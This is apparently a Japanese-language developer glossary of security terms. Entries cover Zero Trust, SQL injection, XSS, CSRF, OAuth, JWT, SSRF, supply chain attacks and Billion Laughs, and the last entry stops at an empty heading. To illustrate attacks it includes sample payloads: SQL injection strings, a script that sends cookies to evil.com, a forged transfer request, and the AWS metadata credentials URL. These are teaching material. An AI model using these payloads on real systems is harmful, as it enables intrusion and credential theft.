# セキュリティ

---

## Zero Trust

別名: ゼロトラスト / Never Trust, Always Verify

### 意味
ネットワークの内外を問わず、すべてのアクセスを信頼せず、常に検証する設計思想。従来の「社内ネットワークは安全」という境界型防御を否定し、すべてのリクエストに対して認証・認可・暗号化を要求する。

### よくある例
- Google の BeyondCorp モデルで、VPN なしに社内アプリへアクセスする際もデバイス証明書とユーザー認証を毎回検証する
- Kubernetes の service mesh（Istio / Linkerd）で Pod 間通信に mTLS を強制し、同一クラスタ内でも暗号化・認証を行う
- API Gateway ですべてのリクエストに JWT 検証を行い、内部サービス間でもトークンを伝播させる
- AWS の VPC 内であっても、IAM ロールと Security Group の両方でアクセスを制限する

### ありがちな症状
- 「社内ネットワークだから認証不要」という前提でサービスが構築されている
- VPN に接続すればすべての内部リソースにアクセスできる
- マイクロサービス間の通信が平文で、認証なしで呼び出せる

### 近い言葉との違い
- 境界型防御（Perimeter Security）: 社内外の境界にファイアウォールを置く従来型。Zero Trust は境界を信頼しない
- [ディフェンス・イン・デプス](design.md#ディフェンスインデプス): 多層防御の考え方で、Zero Trust と補完関係にある。Zero Trust は「信頼しない」が原則、ディフェンス・イン・デプスは「層を重ねる」が原則
- [Least Privilege (IAM)](aws-iac.md#least-privilege-iam): Zero Trust を実現するための具体的手段の一つ

### 背景・語源
2010 年に Forrester Research のアナリスト John Kindervag が提唱した概念。Google が 2014 年に BeyondCorp として実装・論文公開したことで広く知られるようになった。COVID-19 によるリモートワークの普及で、VPN 依存の限界が露呈し、Zero Trust の採用が急速に進んだ。

### 対策
- サービス間通信に mTLS を導入し、通信の暗号化と相互認証を行う
- API Gateway やサービスメッシュで、すべてのリクエストに認証・認可を適用する
- [Least Privilege (IAM)](aws-iac.md#least-privilege-iam) を徹底し、必要最小限の権限のみを付与する
- ネットワークセグメンテーションを細かく行い、横方向の移動（Lateral Movement）を制限する

### 関連用語
- [認証と認可](#認証と認可authenticationvsauthorization)
- [OAuth 2.0 / OIDC](#oauth-20--oidc)
- [RBAC / ABAC](#rbac--abac)
- [Least Privilege (IAM)](aws-iac.md#least-privilege-iam)
- [ディフェンス・イン・デプス](design.md#ディフェンスインデプス)

---

## SQL Injection

別名: SQLインジェクション / SQLi

### 意味
ユーザー入力を適切にサニタイズせずに SQL クエリに組み込むことで、攻撃者が任意の SQL を実行できてしまう脆弱性。データの漏洩、改ざん、削除、さらには OS コマンドの実行にまで至る場合がある。

### よくある例
- ログインフォームで `' OR 1=1 --` を入力し、認証をバイパスする
- 検索フォームで `'; DROP TABLE users; --` を入力し、テーブルを削除する
- Rails で `User.where("name = '#{params[:name]}'")` のように文字列展開で直接入力を埋め込む

悪い例:
```ruby
User.where("email = '#{params[:email]}'")
```

良い例:
```ruby
User.where(email: params[:email])
User.where("email = ?", params[:email])
```

### ありがちな症状
- ORM を使わず、文字列結合で SQL を組み立てている箇所がある
- WAF のログに `UNION SELECT` や `' OR '1'='1` を含むリクエストが頻出している
- DB のエラーメッセージがそのままユーザーに表示される

### 近い言葉との違い
- [XSS](#xsscross-site-scripting): ブラウザ上でスクリプトを実行する攻撃。SQL Injection はデータベースを標的とする
- [SSRF](#ssrfserver-side-request-forgery): サーバーに不正なリクエストを送らせる攻撃。SQL Injection は SQL クエリを不正に操作する
- NoSQL Injection: MongoDB 等の NoSQL データベースに対する同種の攻撃。原理は同じだが構文が異なる

### 背景・語源
1998 年に phrack magazine で Jeff Forristal（rain.forest.puppy）が初めて公式に報告した攻撃手法。OWASP Top 10 では長年 1 位に君臨し、2021 年版では「Injection」カテゴリとして 3 位。20 年以上経った今でも発見される、最も基本的かつ危険な脆弱性の一つ。

### 対策
- ORM を使うか、パラメータ化クエリ（Prepared Statement）を必ず使用する
- ユーザー入力を SQL に直接文字列結合しない
- データベースユーザーの権限を最小限にし、アプリケーションから DROP や ALTER を実行できないようにする
- WAF（Web Application Firewall）を導入し、既知の攻撃パターンをブロックする

### 関連用語
- [XSS](#xsscross-site-scripting)
- [SSRF](#ssrfserver-side-request-forgery)
- [CSRF](#csrfcross-site-request-forgery)

---

## XSS（Cross-Site Scripting）

別名: クロスサイトスクリプティング

### 意味
Web アプリケーションがユーザー入力を適切にエスケープせずに HTML に出力することで、攻撃者が悪意のあるスクリプトを他のユーザーのブラウザで実行できる脆弱性。Stored（格納型）、Reflected（反射型）、DOM-based の 3 種類がある。

### よくある例
- 掲示板の投稿に `<script>document.location='https://evil.com/?c='+document.cookie</script>` を埋め込み、Cookie を窃取する（Stored XSS）
- 検索パラメータ `?q=<script>alert(1)</script>` がそのまま HTML に出力される（Reflected XSS）
- React で `dangerouslySetInnerHTML` にユーザー入力をそのまま渡す
- Rails の ERB で `<%= raw user_input %>` や `html_safe` を不用意に使う

### ありがちな症状
- ユーザーが投稿したコンテンツに HTML タグがそのままレンダリングされている
- Content-Security-Policy ヘッダーが設定されていない
- フロントエンドフレームワークのエスケープ機構を `dangerouslySetInnerHTML` 等で明示的にバイパスしている

### 近い言葉との違い
- [SQL Injection](#sql-injection): データベースを標的とする注入攻撃。XSS はブラウザを標的とする
- [CSRF](#csrfcross-site-request-forgery): 正規ユーザーの権限で不正リクエストを送る。XSS はスクリプト実行で直接操作する
- HTML Injection: HTML を注入するが、JavaScript は実行しない。XSS は JavaScript 実行を伴う

### 対策
- 出力時に必ずコンテキストに応じたエスケープを行う（HTML / JavaScript / URL / CSS）
- Content-Security-Policy（CSP）ヘッダーを設定し、インラインスクリプトの実行を制限する
- React / Vue などのフレームワークが提供する自動エスケープを活用し、手動での `innerHTML` 操作を避ける
- Cookie に `HttpOnly` 属性を付与し、JavaScript から Cookie を読み取れないようにする

### 関連用語
- [SQL Injection](#sql-injection)
- [CSRF](#csrfcross-site-request-forgery)
- [CORS](#corscross-origin-resource-sharing)

---

## CSRF（Cross-Site Request Forgery）

別名: クロスサイトリクエストフォージェリ / シーサーフ / XSRF

### 意味
攻撃者が悪意のあるサイトを通じて、ログイン済みユーザーの権限で意図しないリクエストをサーバーに送信させる攻撃。ユーザーのブラウザが自動的に Cookie を送信する仕組みを悪用する。

### よくある例
- 攻撃者のサイトに `<img src="https://bank.example.com/transfer?to=attacker&amount=1000000">` を埋め込み、ログイン済みユーザーが訪問すると送金が実行される
- Rails で `protect_from_forgery` を無効化している API エンドポイントが狙われる
- SPA のバックエンド API で CSRF トークン検証が漏れている

### ありがちな症状
- フォーム送信時に CSRF トークンが含まれていない
- Cookie の `SameSite` 属性が `None` に設定されている
- 状態を変更する操作（POST / PUT / DELETE）が GET リクエストでも実行できる

### 近い言葉との違い
- [XSS](#xsscross-site-scripting): ブラウザ上でスクリプトを実行する。CSRF は正規リクエストを偽造する。XSS があると CSRF 対策（トークン）を無効化できるため、XSS のほうが上位の脅威
- [SSRF](#ssrfserver-side-request-forgery): サーバーに不正なリクエストを送らせる。CSRF はユーザーのブラウザに不正リクエストを送らせる
- クリックジャッキング: ユーザーに意図しないクリックをさせる。CSRF はリクエスト自体を偽造する

### 対策
- Rails では `protect_from_forgery with: :exception` を有効化する
- Cookie に `SameSite=Lax` または `SameSite=Strict` を設定する
- 状態変更は POST / PUT / DELETE のみで受け付け、GET では変更しない
- CSRF トークンをリクエストヘッダーまたはフォームの hidden フィールドに含める
- SPA の場合は `Authorization` ヘッダーによるトークンベース認証を検討する

### 関連用語
- [XSS](#xsscross-site-scripting)
- [認証と認可](#認証と認可authenticationvsauthorization)
- [CORS](#corscross-origin-resource-sharing)

---

## 認証と認可（Authentication vs Authorization）

別名: AuthN vs AuthZ / 認証と権限

### 意味
認証（Authentication）は「あなたは誰か」を確認するプロセス。認可（Authorization）は「あなたに何が許可されているか」を判定するプロセス。この 2 つは密接に関連するが、明確に異なる概念であり、混同するとセキュリティホールを生む。

### よくある例
- ログイン画面でのパスワード検証は「認証」、ログイン後に管理画面にアクセスできるか判定するのは「認可」
- AWS IAM でユーザーがアクセスキーで API を呼ぶのは「認証」、IAM ポリシーで S3 への書き込みを許可するのは「認可」
- Kubernetes で ServiceAccount トークンで Pod を識別するのは「認証」、RBAC で特定の namespace への操作を許可するのは「認可」

### ありがちな症状
- 「ログインできた＝何でもできる」という設計になっている
- 管理者用 API に認証はあるが、一般ユーザーでもアクセスできる（認可の欠如）
- 「認証を実装した」と言いながら、権限チェックが一切ない

### 近い言葉との違い
- [OAuth 2.0 / OIDC](#oauth-20--oidc): OAuth 2.0 は認可のフレームワーク、OIDC は認証のレイヤー。OAuth で「ログイン」を実装しようとすると認証の欠落が起きる
- [RBAC / ABAC](#rbac--abac): 認可を実現するための具体的なモデル
- [JWT](#jwtjson-web-token): 認証・認可の情報を運ぶトークン形式であり、認証・認可そのものではない

### 対策
- 認証と認可を別のレイヤーとして設計し、それぞれ独立してテストする
- すべてのエンドポイントで認可チェックを行い、認証済みだけで通さない
- [RBAC / ABAC](#rbac--abac) を導入し、権限モデルを明示的に定義する
- 認証には多要素認証（MFA）を導入し、認可にはポリシーベースの制御を適用する

### 関連用語
- [OAuth 2.0 / OIDC](#oauth-20--oidc)
- [JWT](#jwtjson-web-token)
- [RBAC / ABAC](#rbac--abac)
- [Zero Trust](#zero-trust)

---

## OAuth 2.0 / OIDC

別名: Open Authorization 2.0 / OpenID Connect

### 意味
OAuth 2.0 は、ユーザーのパスワードを第三者に渡すことなく、リソースへのアクセス権を委譲するための認可フレームワーク。OIDC（OpenID Connect）は OAuth 2.0 の上に構築された認証レイヤーで、ユーザーの身元確認（ID トークン）を提供する。

### よくある例
- 「Google でログイン」ボタン — OIDC を使ってユーザーの身元を確認し、アクセストークンで Google API にアクセスする
- GitHub OAuth Apps でリポジトリへの読み取り権限を要求し、CI ツールがコードを取得する
- Terraform Cloud が AWS にアクセスする際に OIDC フェデレーションでアクセスキーなしで認証する
- SPA で Authorization Code Flow + PKCE を使い、アクセストークンを安全に取得する

### ありがちな症状
- OAuth 2.0 を「ログイン」に使っているが、ID トークンの検証をしておらず、なりすましが可能
- アクセストークンをローカルストレージに保存し、XSS で窃取されるリスクがある
- scope を `*` や過剰に広い範囲で要求し、最小権限の原則に反している
- state パラメータを検証しておらず、CSRF 攻撃に脆弱

### 近い言葉との違い
- [認証と認可](#認証と認可authenticationvsauthorization): OAuth 2.0 は認可、OIDC は認証。混同すると「OAuth でログイン」の脆弱性を生む
- [JWT](#jwtjson-web-token): OIDC の ID トークンは JWT 形式。JWT は単なるトークン形式であり、プロトコルではない
- SAML: エンタープライズ向けの認証・認可プロトコル。XML ベースで複雑。OIDC は JSON ベースで Web/モバイル向き

### 対策
- 認証が必要なら OAuth 2.0 単体ではなく OIDC を使い、ID トークンを適切に検証する
- SPA では Authorization Code Flow + PKCE を使い、Implicit Flow は避ける
- アクセストークンは HttpOnly Cookie または BFF（Backend For Frontend）パターンで管理する
- scope は最小限にし、必要なリソースへのアクセスのみを要求する

### 関連用語
- [認証と認可](#認証と認可authenticationvsauthorization)
- [JWT](#jwtjson-web-token)
- [CSRF](#csrfcross-site-request-forgery)
- [CORS](#corscross-origin-resource-sharing)

---

## JWT（JSON Web Token）

別名: ジェイダブリューティー / ジョット

### 意味
JSON 形式のペイロード（クレーム）をBase64 エンコードし、署名を付与したトークン形式。Header・Payload・Signature の 3 パートで構成され、ステートレスな認証・認可情報の伝達に使われる。署名により改ざん検知が可能だが、暗号化ではないため内容は誰でも読める。

### よくある例
- API の認証で `Authorization: Bearer <JWT>` ヘッダーを送信し、サーバー側で署名を検証する
- OIDC の ID トークンとして、ユーザー情報（sub, email, name）をクレームに含める
- マイクロサービス間でユーザーのロール情報を JWT に含めて伝播させる

### ありがちな症状
- JWT の有効期限（exp）が極端に長い（数日〜数週間）
- 署名アルゴリズムが `none` に設定可能で、署名検証がバイパスされる
- JWT を「暗号化されている」と誤解し、機密情報をペイロードに含めている
- トークンの失効（Revocation）ができず、漏洩時に対処できない

### 近い言葉との違い
- [OAuth 2.0 / OIDC](#oauth-20--oidc): JWT はトークンの「形式」、OAuth/OIDC はプロトコル。JWT は OAuth のアクセストークンや OIDC の ID トークンとして使われる
- Session Cookie: サーバー側でセッション状態を管理する。JWT はステートレスでサーバーに状態を持たない
- API Key: 固定の文字列で認証する。JWT は有効期限やクレーム情報を内包し、署名で検証できる
- Opaque Token: 中身を見られないトークン。JWT は中身が可視（ただし署名で保護）

### 対策
- 有効期限（exp）は短く設定し（5〜15 分程度）、リフレッシュトークンで更新する
- 署名アルゴリズムを明示的に指定し、`none` や `HS256`（共有鍵）の使用を避ける。`RS256` や `ES256` を使う
- ペイロードに機密情報を含めない（Base64 はデコード可能）
- トークン失効が必要な場合はブラックリストや短い有効期限 + リフレッシュトークンの組み合わせを検討する

### 関連用語
- [OAuth 2.0 / OIDC](#oauth-20--oidc)
- [認証と認可](#認証と認可authenticationvsauthorization)
- [Secret Rotation](#secret-rotation)

---

## RBAC / ABAC

別名: Role-Based Access Control / Attribute-Based Access Control

### 意味
RBAC は「ロール（役割）」に基づいてアクセス権を制御するモデル。ユーザーにロールを割り当て、ロールに権限を紐付ける。ABAC は「属性（ユーザー属性、リソース属性、環境属性）」の組み合わせでアクセスを判定するモデル。RBAC より柔軟だが複雑。

### よくある例
- AWS IAM でロール（`AdminRole`, `ReadOnlyRole`）を定義し、ユーザーやサービスに割り当てる（RBAC）
- Kubernetes で `ClusterRole` / `Role` と `RoleBinding` を使い、namespace ごとに権限を管理する（RBAC）
- 「部署が "開発" かつ環境が "staging" かつ時間が "業務時間内" ならデプロイを許可」のように属性で判定する（ABAC）
- AWS IAM ポリシーの Condition 句でタグやIPアドレスに基づいてアクセスを制限する（ABAC）

### ありがちな症状
- ロールが増えすぎて管理不能になる（Role Explosion）
- 「とりあえず Admin ロール」で全員に管理者権限を付与している
- RBAC だけでは表現できない複雑な条件が増え、例外処理がハードコードされている

### 近い言葉との違い
- [認証と認可](#認証と認可authenticationvsauthorization): RBAC / ABAC は認可を実現するモデル。認証は別途必要
- ACL（Access Control List）: リソースごとに「誰がアクセスできるか」をリストで管理する。RBAC は「ロール」で抽象化する点で異なる
- [Least Privilege (IAM)](aws-iac.md#least-privilege-iam): 最小権限の原則。RBAC / ABAC で実装する際に守るべき指針

### 対策
- まず RBAC で設計し、複雑な要件が出てきたら ABAC を組み合わせる
- ロールは「職責」に基づいて定義し、個人ごとのカスタムロールを作らない
- 定期的にロールと権限のレビュー（Access Review）を行い、不要な権限を削除する
- AWS では IAM Access Analyzer を活用し、未使用の権限を検出する

### 関連用語
- [認証と認可](#認証と認可authenticationvsauthorization)
- [Zero Trust](#zero-trust)
- [Least Privilege (IAM)](aws-iac.md#least-privilege-iam)

---

## Secret Rotation

別名: シークレットローテーション / 鍵のローテーション

### 意味
API キー、パスワード、証明書などのシークレット（秘密情報）を定期的に更新し、古いシークレットを無効化するプロセス。シークレットの漏洩リスクを時間的に限定し、被害の拡大を防ぐ。

### よくある例
- AWS Secrets Manager で RDS のパスワードを 30 日ごとに自動ローテーションする
- HashiCorp Vault でデータベースの動的シークレットを発行し、有効期限付きの一時認証情報を使う
- GitHub Actions の `GITHUB_TOKEN` が実行ごとに自動生成・失効する
- AWS IAM アクセスキーを 90 日ごとにローテーションするポリシーを設定する

### ありがちな症状
- 本番環境の API キーが作成以来一度も変更されていない
- シークレットが `.env` ファイルや Git リポジトリにハードコードされている
- ローテーション手順が手動で、担当者しか知らない
- ローテーション時にダウンタイムが発生する（古い鍵を失効させてから新しい鍵を配布するため）

### 近い言葉との違い
- [暗号化の基礎](#暗号化の基礎encryption-at-rest--in-transit): 暗号化はデータを保護する技術。Secret Rotation は鍵自体のライフサイクル管理
- Key Management: 鍵の生成・保管・配布・廃棄の全体管理。Secret Rotation はその中の「更新」プロセス
- Certificate Renewal: TLS 証明書の更新。Secret Rotation の一種だが、PKI の文脈で語られることが多い

### 対策
- AWS Secrets Manager や HashiCorp Vault を使い、ローテーションを自動化する
- ローテーション時にダウンタイムが出ないよう、新旧の鍵を一定期間並行して有効にする（Dual-write パターン）
- シークレットはコードやリポジトリに含めず、環境変数またはシークレットマネージャーから取得する
- 短命なトークン（STS の一時認証情報、Vault の動的シークレット）を優先し、長期間有効な鍵の使用を減らす

### 関連用語
- [暗号化の基礎](#暗号化の基礎encryption-at-rest--in-transit)
- [JWT](#jwtjson-web-token)
- [Least Privilege (IAM)](aws-iac.md#least-privilege-iam)

---

## Supply Chain Attack

別名: サプライチェーン攻撃 / ソフトウェアサプライチェーン攻撃

### 意味
ソフトウェアの依存関係（ライブラリ、ツール、ビルドシステム）を経由して悪意のあるコードを混入させる攻撃。直接アプリケーションを攻撃するのではなく、信頼されたサプライチェーンの一部を侵害することで、広範囲に被害を及ぼす。

### よくある例
- log4j（Log4Shell, 2021）: Java の広く使われるログライブラリに重大な RCE 脆弱性が発見され、世界中のシステムに影響
- xz-utils（2024）: Linux の圧縮ライブラリのメンテナーアカウントが乗っ取られ、バックドアが仕込まれた
- event-stream（2018）: npm パッケージのメンテナが交代し、暗号通貨ウォレットを窃取するコードが追加された
- polyfill.io（2024）: CDN のドメインが買収され、配信される JavaScript にマルウェアが混入された

### ありがちな症状
- 依存ライブラリのバージョンを固定せず、常に latest を取得している
- `npm install` や `pip install` 時に lockfile が更新されてもレビューしていない
- 内部パッケージレジストリがなく、すべて公開レジストリから直接取得している
- 依存関係の脆弱性スキャン（Dependabot, Snyk 等）が導入されていない

### 近い言葉との違い
- [Dependency Confusion](#dependency-confusion): Supply Chain Attack の一手法。パッケージマネージャーの名前解決を悪用する
- ゼロデイ攻撃: 未知の脆弱性を突く攻撃。Supply Chain Attack は既知・未知を問わず、サプライチェーン経由で攻撃する
- [SQL Injection](#sql-injection) / [XSS](#xsscross-site-scripting): アプリケーション自体の脆弱性を直接突く攻撃。Supply Chain Attack は依存関係を経由する

### 対策
- Dependabot、Snyk、Trivy などで依存関係の脆弱性を継続的にスキャンする
- lockfile（`package-lock.json`, `Gemfile.lock`, `poetry.lock`）をコミットし、CI で整合性を検証する
- 重要な依存関係は SBOM（Software Bill of Materials）を生成して管理する
- Docker イメージにも脆弱性スキャンを実施し、ベースイメージを定期的に更新する
- 内部パッケージには private registry を使い、[Dependency Confusion](#dependency-confusion) を防ぐ

### 関連用語
- [Dependency Confusion](#dependency-confusion)
- [Secret Rotation](#secret-rotation)
- [Shift Left](testing.md#shift-left)

---

## CORS（Cross-Origin Resource Sharing）

別名: クロスオリジンリソース共有

### 意味
ブラウザが異なるオリジン（プロトコル + ホスト + ポートの組み合わせ）へのリクエストを制限する仕組み（Same-Origin Policy）を、サーバー側のレスポンスヘッダーで選択的に緩和するメカニズム。フロントエンドとバックエンドが異なるドメインにある場合に必ず遭遇する。

### よくある例
- `localhost:3000` のフロントエンドから `localhost:8080` の API にリクエストすると、ブラウザが CORS エラーをブロックする
- `Access-Control-Allow-Origin: *` を設定して全オリジンを許可してしまい、セキュリティリスクを生む
- PUT / DELETE リクエストで preflight（OPTIONS リクエスト）が飛び、サーバーが 405 を返す
- Rails API で `rack-cors` gem を設定し、特定のフロントエンドドメインのみを許可する

### ありがちな症状
- ブラウザのコンソールに `Access-Control-Allow-Origin` 関連のエラーが出る
- `curl` では動作するのにブラウザからはリクエストが失敗する（CORS はブラウザの制約であり、サーバー間通信には影響しない）
- preflight リクエスト（OPTIONS）がサーバーで処理されず、本来のリクエストが送信されない

### 近い言葉との違い
- Same-Origin Policy: ブラウザの根本的なセキュリティポリシー。CORS はその制限を部分的に緩和する仕組み
- [CSRF](#csrfcross-site-request-forgery): クロスオリジンのリクエスト偽造攻撃。CORS はクロスオリジンのアクセスを制御する仕組み
- CSP（Content Security Policy）: ページ内で読み込めるリソースのオリジンを制限する。CORS はサーバーが「誰にアクセスを許可するか」を制御する

### 対策
- `Access-Control-Allow-Origin` にはワイルドカード `*` ではなく、許可するオリジンを明示的に指定する
- preflight リクエスト（OPTIONS）を正しく処理し、`Access-Control-Allow-Methods` と `Access-Control-Allow-Headers` を返す
- 認証情報を含むリクエスト（`credentials: 'include'`）を許可する場合、`*` は使えないため注意する
- 開発環境では proxy 設定（webpack-dev-server, vite）で CORS を回避し、本番では適切なヘッダーを設定する

### 関連用語
- [CSRF](#csrfcross-site-request-forgery)
- [XSS](#xsscross-site-scripting)
- [認証と認可](#認証と認可authenticationvsauthorization)

---

## SSRF（Server-Side Request Forgery）

別名: サーバーサイドリクエストフォージェリ

### 意味
攻撃者がサーバーに不正な URL へのリクエストを発行させることで、本来アクセスできない内部リソース（メタデータエンドポイント、内部 API、データベース）に到達する攻撃。OWASP Top 10（2021）で新たにランクインした、クラウド環境で特に危険な脆弱性。

### よくある例
- AWS EC2 のメタデータエンドポイント `http://169.254.169.254/latest/meta-data/iam/security-credentials/` に内部からリクエストさせ、IAM ロールの一時認証情報を窃取する
- 画像 URL のプレビュー機能で `http://localhost:6379/` を指定し、内部の Redis に直接コマンドを送る
- Webhook の URL 検証なしに `http://10.0.0.1/admin` のような内部 IP を受け入れてしまう

### ありがちな症状
- ユーザーが URL を入力できる機能（画像アップロード、Webhook、URL プレビュー）があり、入力の検証が不十分
- AWS EC2 インスタンスメタデータサービス（IMDS）が v1（トークン不要）のまま運用されている
- 内部ネットワークのサービスに認証が設定されていない

### 近い言葉との違い
- [CSRF](#csrfcross-site-request-forgery): ユーザーのブラウザを経由してリクエストを偽造する。SSRF はサーバーを経由してリクエストを偽造する
- [SQL Injection](#sql-injection): データベースクエリを操作する。SSRF はサーバーのリクエスト先を操作する
- Open Redirect: リダイレクト先を操作する。SSRF はサーバーのリクエスト先を直接操作する

### 対策
- ユーザー入力の URL をホワイトリストで検証し、プライベート IP アドレス（`10.0.0.0/8`, `172.16.0.0/12`, `169.254.0.0/16`）をブロックする
- AWS EC2 では IMDS v2（トークン必須）を有効化し、メタデータエンドポイントへの不正アクセスを防ぐ
- 外部リクエストを行うサービスを専用のネットワークセグメントに配置し、内部リソースへのアクセスを制限する
- URL のリダイレクトを追跡する場合、リダイレクト先も検証する

### 関連用語
- [CSRF](#csrfcross-site-request-forgery)
- [SQL Injection](#sql-injection)
- [Zero Trust](#zero-trust)

---

## 暗号化の基礎（Encryption at Rest / in Transit）

別名: 保存時暗号化 / 通信時暗号化

### 意味
データの保護には「保存時の暗号化（Encryption at Rest）」と「通信時の暗号化（Encryption in Transit）」の 2 つの側面がある。保存時はディスクやデータベース上のデータを暗号化し、通信時は TLS などで転送中のデータを暗号化する。どちらか一方では不十分であり、両方を適用する必要がある。

### よくある例
- AWS S3 で SSE-S3 / SSE-KMS を有効化し、保存データを暗号化する（Encryption at Rest）
- RDS で暗号化オプションを有効にし、ストレージとスナップショットを暗号化する（Encryption at Rest）
- ALB / CloudFront で TLS 1.2 以上を強制し、クライアントとの通信を暗号化する（Encryption in Transit）
- Kubernetes の Secret を etcd に保存する際に暗号化を有効化する

### ありがちな症状
- S3 バケットの暗号化設定がデフォルト（未暗号化）のまま運用されている
- 内部通信が HTTP で行われ、同一 VPC 内だからと暗号化が省略されている
- TLS の証明書が期限切れになり、サービスが停止する
- KMS の鍵ポリシーが緩く、想定外のサービスからデータを復号できる

### 近い言葉との違い
- ハッシュ化: 一方向変換で元のデータに復元できない（パスワード保存に使う）。暗号化は鍵があれば復号できる
- 署名: データの改ざん検知が目的。暗号化はデータの機密性保護が目的
- [Secret Rotation](#secret-rotation): 暗号鍵やシークレットのライフサイクル管理。暗号化はデータ保護の技術そのもの

### 対策
- AWS では S3、RDS、EBS のデフォルト暗号化を有効にし、暗号化忘れを防ぐ
- TLS 1.2 以上を強制し、TLS 1.0 / 1.1 や SSL を無効化する
- KMS のカスタマーマネージドキーを使い、鍵のアクセス制御と監査を行う
- 内部通信も含めてすべての通信を TLS で暗号化する（[Zero Trust](#zero-trust) の原則）
- 暗号鍵は定期的にローテーションする（[Secret Rotation](#secret-rotation)）

### 関連用語
- [Secret Rotation](#secret-rotation)
- [Zero Trust](#zero-trust)
- [Least Privilege (IAM)](aws-iac.md#least-privilege-iam)

---

## ペネトレーションテスト

別名: Penetration Testing / ペンテスト / Pentest

### 意味
実際の攻撃者の視点からシステムの脆弱性を発見するために、許可された範囲内で意図的に侵入を試みるセキュリティテスト手法。自動スキャンでは発見できない論理的な脆弱性や、複数の弱点を組み合わせた攻撃チェーンを検出できる。

### よくある例
- 外部のセキュリティ企業に依頼し、本番環境に対して Web アプリケーションのペンテストを実施する
- OWASP ZAP や Burp Suite を使い、開発チーム自身で定期的に脆弱性診断を行う
- AWS 上でペンテストを実施する際に、AWS のペネトレーションテストポリシーに従い事前承認不要のサービスを確認する
- CI/CD パイプラインに DAST（Dynamic Application Security Testing）を組み込み、デプロイ前に自動スキャンする

### ありがちな症状
- 「セキュリティテスト＝脆弱性スキャンツールの実行だけ」になっている
- ペンテストの結果が報告書として共有されるだけで、修正が追跡されていない
- 年 1 回しかペンテストを実施せず、その間のリリースは検証されていない

### 近い言葉との違い
- 脆弱性スキャン: 既知の脆弱性パターンを自動検出する。ペンテストは手動での論理的な攻撃も含む
- Red Team: 組織全体（物理セキュリティ、ソーシャルエンジニアリング含む）を対象にした攻撃シミュレーション。ペンテストは特定のシステムに焦点を当てる
- Bug Bounty: 外部のセキュリティ研究者が報奨金目的で脆弱性を報告する制度。ペンテストは組織が依頼して実施する

### 対策
- 定期的（四半期〜年 1 回）にペンテストを実施し、結果を Issue として追跡・修正する
- 自動スキャン（SAST / DAST）と手動テストを組み合わせる
- [Shift Left](testing.md#shift-left) の考え方で、開発の早い段階からセキュリティテストを組み込む
- ペンテストの scope と rules of engagement を明確にし、本番環境への影響を最小化する

### 関連用語
- [SQL Injection](#sql-injection)
- [XSS](#xsscross-site-scripting)
- [SSRF](#ssrfserver-side-request-forgery)
- [Shift Left](testing.md#shift-left)

---

## Dependency Confusion

別名: 依存関係かく乱攻撃 / Namespace Confusion

### 意味
組織が内部で使用しているプライベートパッケージと同じ名前のパッケージを公開レジストリに公開し、パッケージマネージャーが公開版を優先的にインストールするよう仕向ける攻撃手法。内部パッケージ名が推測可能な場合に特に危険。

### よくある例
- npm の場合、社内スコープなし（`company-utils`）で内部パッケージを運用しており、攻撃者が同名のパッケージを npmjs.com に公開してより高いバージョン番号を付ける
- pip の場合、`--extra-index-url` で社内 PyPI を追加しているが、公開 PyPI が優先され悪意のあるパッケージがインストールされる
- CI/CD パイプラインで `npm install` 時に自動的に公開レジストリの偽パッケージがインストールされ、ビルド環境で任意のコードが実行される

### ありがちな症状
- 内部パッケージがスコープ（npm の `@company/`）やネームスペースなしで運用されている
- `.npmrc` や `pip.conf` でレジストリの優先順位が正しく設定されていない
- lockfile の更新差分がレビューされておらず、依存関係の変更が見逃されている
- 内部パッケージ名が推測しやすい命名規則（`company-auth`, `internal-utils` 等）になっている

### 近い言葉との違い
- [Supply Chain Attack](#supply-chain-attack): Dependency Confusion は Supply Chain Attack の一手法。Supply Chain Attack はより広い概念
- Typosquatting: パッケージ名のタイポを狙う（例: `lodash` → `1odash`）。Dependency Confusion は正確な名前の一致を狙う
- Dependency Hijacking: 既存パッケージのメンテナ権限を乗っ取る。Dependency Confusion は新しいパッケージを公開する

### 背景・語源
2021 年にセキュリティ研究者 Alex Birsan が Apple、Microsoft、PayPal 等の企業に対してこの手法を実証し、Bug Bounty で 130,000 ドル以上を獲得した。内部パッケージ名が JavaScript のソースマップや package.json から推測可能であったことが発覚し、広く注目された。

### 対策
- npm では `@company/` スコープを使い、公開レジストリとの名前衝突を防ぐ
- pip では `--index-url`（公開 PyPI を無効化）と `--extra-index-url` の使い分けを正しく行う
- 内部パッケージ名を公開レジストリに「予約」として登録する（名前の占有）
- lockfile の変更を CI でチェックし、予期しない依存関係の追加を検出する
- Artifactory や CodeArtifact などのプライベートレジストリをプロキシとして使い、パッケージの解決順序を制御する

### 関連用語
- [Supply Chain Attack](#supply-chain-attack)
- [Secret Rotation](#secret-rotation)
- [Shift Left](testing.md#shift-left)

---

## Billion Laughs Attack

別名: 10億笑い攻撃 / XML Bomb / Exponential Entity Expansion / XEE

### 意味
XML の実体参照（Entity）がネスト定義できる仕様を悪用し、小さな XML ドキュメントを展開するとメモリが指数関数的に膨張する DoS 攻撃。わずか数 KB の入力でパーサーが数 GB のメモリを消費し、プロセスやサーバーを停止させる。

### よくある例
- `lol1` → `lol2` → ... `lol9` と 10 段階にネストした実体を定義し、`&lol9;` を 1 回参照するだけで `"lol"` が 10 億個に展開される
- SAML レスポンス、SOAP API、RSS フィード、Office Open XML（docx / xlsx）のパーサーが外部から受け取った XML を無防備に展開してしまう
- Java の `DocumentBuilderFactory` や Python の `xml.etree.ElementTree`（古いバージョン）でデフォルト設定のまま XML を受け付け、1 リクエストでワーカープロセスが OOM Kill される
- YAML でも同種の攻撃が可能で、2019 年に Kubernetes API に対する YAML Bomb（CVE-2019-11253）が報告された

### ありがちな症状
- 特定のリクエストを受けたタイミングで API サーバーの Pod が OOMKilled を繰り返す
- XML / SAML を扱うエンドポイントの CPU・メモリ使用量が単発リクエストで急騰する
- パーサーが「展開済みノード数」や「エンティティ深さ」の上限を設定していない
- ライブラリのバージョンが古く、DTD 処理がデフォルトで有効になっている

### 近い言葉との違い
- [XXE（XML External Entity）](#ssrfserver-side-request-forgery) に似た別攻撃: XXE は外部エンティティ参照で内部ファイルを読み取る情報漏洩攻撃。Billion Laughs は内部実体のネスト展開による DoS
- Zip Bomb: 圧縮ファイル（例: `42.zip`）を展開すると巨大な容量になる攻撃。原理は似ているが対象が異なる
- ReDoS（Regex Denial of Service）: 正規表現のバックトラック爆発による DoS。こちらは CPU を焼く点が異なる（Billion Laughs はメモリ）
- [SSRF](#ssrfserver-side-request-forgery): XXE を踏み台にして発生することがあるが、Billion Laughs は外部通信を伴わない純粋な計算資源攻撃

### 背景・語源
